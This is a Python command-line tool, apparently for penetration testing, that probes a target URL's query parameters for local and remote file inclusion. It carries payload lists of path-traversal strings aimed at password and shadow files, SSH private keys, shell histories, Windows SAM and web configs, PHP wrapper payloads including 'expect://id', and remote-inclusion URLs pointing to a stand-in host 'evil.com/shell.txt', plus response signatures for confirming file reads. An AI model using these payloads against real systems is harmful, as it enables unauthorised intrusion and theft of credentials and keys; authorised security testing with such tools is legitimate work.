#!/usr/bin/env python3
"""
LFI/RFI Tester
Local File Inclusion and Remote File Inclusion vulnerability tester
"""

import requests
import argparse
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

# LFI payloads for common files
LFI_PAYLOADS = {
    "Linux": [
        "../../../etc/passwd",
        "../../../etc/passwd%00",
        "....//....//....//etc/passwd",
        "....//....//....//etc/passwd%00",
        "..%2f..%2f..%2fetc/passwd",
        "..%2f..%2f..%2fetc/passwd%00",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        "%252e%252e%252fetc/passwd",
        "../../../../../../etc/passwd",
        "/etc/passwd",
        "/etc/passwd%00",
        "../../../etc/shadow",
        "../../../etc/hosts",
        "../../../etc/group",
        "../../../etc/issue",
        "../../../etc/motd",
        "../../../proc/self/environ",
        "../../../proc/self/cmdline",
        "../../../proc/self/status",
        "../../../proc/self/fd/0",
        "../../../proc/self/fd/1",
        "../../../proc/self/fd/2",
        "../../../var/log/apache2/access.log",
        "../../../var/log/apache/access.log",
        "../../../var/log/nginx/access.log",
        "../../../var/log/httpd/access.log",
        "../../../var/www/html/index.php",
        "../../../var/www/html/config.php",
        "../../../var/www/config.php",
        "../../../opt/lampp/htdocs/index.php",
        "../../../usr/share/nginx/html/index.php",
        "../../../home/user/.bash_history",
        "../../../home/user/.ssh/id_rsa",
        "../../../home/user/.ssh/authorized_keys",
        "../../../root/.bash_history",
        "../../../root/.ssh/id_rsa",
        "../../../tmp/sess_*",
    ],
    "Windows": [
        "../../../windows/system32/drivers/etc/hosts",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "..\\..\\..\\windows\\win.ini",
        "../../../windows/win.ini",
        "../../../windows/system32/config/sam",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "../../../inetpub/wwwroot/web.config",
        "..\\..\\..\\inetpub\\wwwroot\\web.config",
        "../../../xampp/htdocs/index.php",
        "..\\..\\..\\xampp\\htdocs\\index.php",
        "C:/windows/system32/drivers/etc/hosts",
        "C:\\windows\\system32\\drivers\\etc\\hosts",
        "C:/windows/win.ini",
        "C:\\windows\\win.ini",
    ],
    "PHP": [
        "../../../php.ini",
        "../../../etc/php.ini",
        "../../../usr/local/etc/php.ini",
        "../../../var/www/html/phpinfo.php",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
        "php://input",
        "php://stdout",
        "php://stderr",
        "php://output",
        "data://text/plain,<?php phpinfo(); ?>",
        "expect://id",
    ],
}

# RFI payloads
RFI_PAYLOADS = [
    "http://evil.com/shell.txt",
    "http://evil.com/shell.txt?",
    "http://evil.com/shell.txt%00",
    "https://evil.com/shell.txt",
    "ftp://evil.com/shell.txt",
]

# Signatures that indicate successful LFI
LFI_SIGNATURES = {
    "passwd": ["root:x:", "daemon:x:", "bin:x:", "sys:x:"],
    "shadow": ["root:", "daemon:", "bin:"],
    "hosts": ["127.0.0.1", "localhost"],
    "win.ini": ["[windows]", "[fonts]"],
    "php.ini": ["[PHP]", "allow_url_"],
    "apache_log": ["GET /", "HTTP/1.1"],
}


def test_lfi(url, param, payload):
    """Test for LFI vulnerability"""
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if param not in params:
            return False, None
        
        params[param] = payload
        new_query = urlencode(params, doseq=True)
        test_url = parsed._replace(query=new_query).geturl()
        
        response = requests.get(test_url, timeout=10)
        content = response.text
        
        # Check for file signatures
        for file_type, signatures in LFI_SIGNATURES.items():
            for sig in signatures:
                if sig in content:
                    return True, f"Found {file_type} content: {sig[:50]}"
        
        # Check for PHP base64 filter output
        if "PD9waHA" in content or "PD9QSFBf" in content:
            return True, "PHP source code disclosure (base64 encoded)"
        
        return False, None
    except Exception as e:
        return False, str(e)


def test_rfi(url, param):
    """Test for RFI vulnerability"""
    # RFI testing requires a controlled server
    # This is a basic check for RFI indicators
    print("[!] RFI testing requires a controlled server to host test files")
    print("[*] Use RFI_PAYLOADS list and host a file on your server")
    return []


def scan_lfi(url):
    """Scan for LFI vulnerabilities"""
    print(f"[*] Scanning: {url}\n")
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        print("[!] No parameters found in URL")
        return []
    
    vulnerabilities = []
    
    for param in params:
        print(f"[*] Testing parameter: {param}")
        
        for os_type, payloads in LFI_PAYLOADS.items():
            print(f"  Testing {os_type} payloads...")
            
            for payload in payloads[:10]:  # Test first 10 of each
                is_vuln, message = test_lfi(url, param, payload)
                if is_vuln:
                    print(f"[+] LFI found!")
                    print(f"    Payload: {payload}")
                    print(f"    Details: {message}")
                    vulnerabilities.append({
                        "param": param,
                        "payload": payload,
                        "type": "LFI",
                        "message": message
                    })
                    break
            
            if any(v['param'] == param for v in vulnerabilities):
                break
    
    return vulnerabilities


def main():
    parser = argparse.ArgumentParser(description="LFI/RFI Tester")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", help="Specific parameter to test")
    parser.add_argument("--rfi", action="store_true", help="Test for RFI (requires controlled server)")
    parser.add_argument("--proxy", help="Proxy URL")
    
    args = parser.parse_args()
    
    if args.proxy:
        requests.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    
    vulnerabilities = scan_lfi(args.url)
    
    print("\n" + "="*60)
    print("SCAN RESULTS")
    print("="*60)
    
    if vulnerabilities:
        print(f"\n[!] Found {len(vulnerabilities)} LFI vulnerability(s):\n")
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"  {i}. Parameter: {vuln['param']}")
            print(f"     Type: {vuln['type']}")
            print(f"     Payload: {vuln['payload']}")
            print(f"     Details: {vuln['message']}")
            print()
    else:
        print("\n[-] No LFI vulnerabilities detected")
    
    if args.rfi:
        print("\n[*] RFI Testing:")
        test_rfi(args.url, args.param)


if __name__ == "__main__":
    main()
